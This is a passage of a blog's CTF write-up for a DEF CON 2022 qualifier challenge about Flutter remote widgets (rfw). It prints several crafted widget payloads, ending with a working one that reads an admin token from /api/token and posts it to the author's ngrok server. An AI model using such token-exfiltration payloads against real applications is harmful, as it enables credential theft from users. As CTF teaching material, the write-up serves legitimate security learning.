widget root <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span>
  <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token function">Row</span><span class="token punctuation">(</span>
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">Text</span><span class="token punctuation">(</span> text<span class="token operator">:</span> <span class="token string">'pewpew'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">Expanded</span><span class="token punctuation">(</span>
            <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span>
              <span class="token literal-property property">text</span><span class="token operator">:</span> data<span class="token punctuation">.</span>author<span class="token punctuation">.</span>user<span class="token punctuation">,</span>
              <span class="token literal-property property">style</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token number">4278230474</span> <span class="token punctuation">&#125;</span>
            <span class="token punctuation">)</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>abc <span class="token operator">=</span> <span class="token string">'abc'</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>But after this step, I got stuck again because ApiMapper can only send GET requests, not POST, which can be proven from the source code:</p>
<p><img src="/img/defcon-2022-qual-writeup/p4.png" alt="ApiMapper"></p>
<h3><span id="2130-3h-50m-another-team-solved-it">21:30 (3h 50m) Another team solved it</span></h3><p>I wanted to get the first blood, but I was outmatched and had to QQ.</p>
<p>At this point, I was still studying the source code, both for the problem and for RFW, to see if I could find more clues.</p>
<h3><span id="2143-4h-03m-found-other-key-points">21:43 (4h 03m) Found other key points</span></h3><p>Both my teammate and I noticed that there was an <code>event api_post</code> in the poll widget that could be used to send POST requests, but we weren’t sure how to trigger it.</p>
<h3><span id="2222-4h-42m-successfully-triggered-the-event">22:22 (4h 42m) Successfully triggered the event</span></h3><p>My teammate found a way to trigger it:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> event <span class="token string">"api_post"</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/test"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token string">"bodytest"</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">)</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I actually tried the same method myself, but for some reason it didn’t work.</p>
<p>Although we could send POST requests, we couldn’t get a response, so it didn’t seem to be useful. I got stuck here for a while.</p>
<p>I felt like we must have missed some important details, otherwise we wouldn’t have been stuck here for so long. So I went back and played the app again to see if there was anything we missed.</p>
<h3><span id="22565h-16m-back-on-track-starting-to-implement-exploit">22:56(5h 16m) Back on track, starting to implement exploit</span></h3><p>After playing through again, I found that there was a GET API <code>/api/token</code> that could retrieve token data, and the data retrieved by ApiMapper would be stored in <code>data</code>. Therefore, we can first use ApiMapper to retrieve the data, and then use <code>event &quot;api_post&quot;</code> to send the retrieved data to obtain the admin token.</p>
<p>The concept is not difficult, but the implementation is difficult. I spent some time sharing this idea with my teammates, thinking that it would be faster if we wrote it together.</p>
<p>During the process of trying, I found that if the onloaded of ApiMapper is directly connected to <code>event &quot;api_post&quot;</code>, it seems that the data cannot be obtained, so I need to find another way. At this time, I thought of the <code>switch</code> that appeared in the poll, and I should be able to use that trick.</p>
<p>By the way, the way I learned rfw was to directly look at the code. In fact, the comments and tests were written in detail, and there was much more information than the documentation: <a target="_blank" rel="noopener" href="https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479">https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479</a></p>
<h3><span id="23195h-39m-failed-exploit">23:19(5h 39m) Failed exploit</span></h3><p>I wrote a widget that I thought would succeed no matter how I looked at it:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">widget root <span class="token punctuation">&#123;</span> <span class="token literal-property property">loaded</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span>
  <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">Text</span><span class="token punctuation">(</span>
            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">"test"</span>
          <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token keyword">switch</span> state<span class="token punctuation">.</span>loaded <span class="token punctuation">&#123;</span>
            <span class="token number">2</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> event <span class="token string">"api_post"</span> <span class="token punctuation">&#123;</span>
                <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/send"</span><span class="token punctuation">,</span>
                <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                  <span class="token string-property property">"token"</span><span class="token operator">:</span> data<span class="token punctuation">.</span>new_token
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token number">1</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span>
              <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'yo'</span>
            <span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>But for some reason, it failed. The second request could not be sent out, so I had to continue trying other methods.</p>
<h3><span id="23255h-45m-solved">23:25(5h 45m) Solved 🎉</span></h3><p>Finally, I used this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> core<span class="token punctuation">.</span>widgets<span class="token punctuation">;</span>
<span class="token keyword">import</span> core<span class="token punctuation">.</span>material<span class="token punctuation">;</span>
<span class="token keyword">import</span> local<span class="token punctuation">;</span>

widget root <span class="token punctuation">&#123;</span> <span class="token literal-property property">loaded</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">Container</span><span class="token punctuation">(</span>
  <span class="token literal-property property">child</span><span class="token operator">:</span> <span class="token function">Column</span><span class="token punctuation">(</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token function">Row</span><span class="token punctuation">(</span> 
        <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token function">Text</span><span class="token punctuation">(</span>
            <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">"test"</span>
          <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
            <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/json"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"a"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"b"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> event <span class="token string">"api_post"</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">"@example.ngrok.io/send"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string-property property">"token"</span><span class="token operator">:</span> data<span class="token punctuation">.</span>new_token
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token keyword">switch</span> state<span class="token punctuation">.</span>loaded <span class="token punctuation">&#123;</span>
            <span class="token number">1</span><span class="token operator">:</span> <span class="token function">ApiMapper</span><span class="token punctuation">(</span>
              <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">"/api/token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">jsonKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">dataKey</span><span class="token operator">:</span> <span class="token string">"new_token"</span><span class="token punctuation">,</span>
              <span class="token literal-property property">onLoaded</span><span class="token operator">:</span> <span class="token keyword">set</span> state<span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">Text</span><span class="token punctuation">(</span>
              <span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'yo'</span>
            <span class="token punctuation">)</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">]</span>
      <span class="token punctuation">)</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>That switch has no function, and it doesn’t matter if it is removed. It’s just because I was too lazy to delete it before.</p>
<p>In short, the concept is that we can use two ApiMappers at the same time. The first one is sent to our server and waits for 3 seconds. In this way, when <code>onLoaded</code> is triggered, the response that retrieves the token has already returned, so <code>data.new_token</code> is the token, and it will be sent to our server.</p>
<p><img src="/img/defcon-2022-qual-writeup/p5.png" alt="token"></p>
<h2><span id="summary">Summary</span></h2><p>Finally, summarize the solution to this problem:</p>
<ol>
<li>Observe the App and find out that custom widgets can be loaded</li>
<li>Learn how to generate a valid widget</li>
<li>Observe the existing remote widgets and find out that there are ApiMapper and api_post</li>
<li>Observe the App and find out that <code>/api/token</code> can retrieve the token and get the response</li>
<li>Write a widget that can first use ApiMapper to retrieve the token and then use api_post to send it out</li>
</ol>
<p>This is what I said at the beginning. The difficulty of this problem is not high, and it tests basic skills. What I mean by basic skills is:</p>
<ol>
<li>Observation: You must be able to observe that this problem uses rfw and how the existing mechanisms work, including <code>/api/token</code>, <code>/api/flag</code>, and the logic of various existing widgets.</li>
<li>Ability to learn new things: You must be able to quickly learn the basic syntax of dart in rfw.</li>
<li>Ability to write code: You must be able to make a working widget and use existing mechanisms to make it work.</li>
</ol>
<p>The concept of this problem is not difficult, and the time spent is due to being unfamiliar with flutter&#x2F;dart&#x2F;rfw, so there are always syntax errors or situations where it just doesn’t work.</p>
<p>As for self-reflection, I probably looked in the wrong direction at the beginning and should have observed for a while longer. For example, if you decode the poll widget at the beginning and observe it carefully, you may be able to save a lot of time.</p>
<p>By the way, after following the team to play the qualification round, my biggest realization is that if you want to truly enjoy DEF CON CTF, you still need basic knowledge of binary-related knowledge. I don’t think it needs to be very strong, but at least basic knowledge (such as being able to solve very simple pwn and reverse problems in other CTFs?), so that you can know what your teammates are doing and have a sense of participation.</p>
<p>If you don’t know anything like me, I think it’s a bit of a pity. This feels like, at least you have to play a little bit of LOL, and then you will know what’s going on when you watch the game, and you will know which side is good-looking. If you haven’t played it, you basically can’t understand it, and you won’t react even if you see a player using a powerful ultimate.</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/06/14/en/justctf-2022-xsleak-writeup/">justCTF 2022 - Baby XSLeak Write-up</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/05/23/en/atomic-css-and-tailwind-css/">An Introduction to the Tailwind CSS and Atomic CSS</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2024 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/06/03/defcon-2022-qual-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>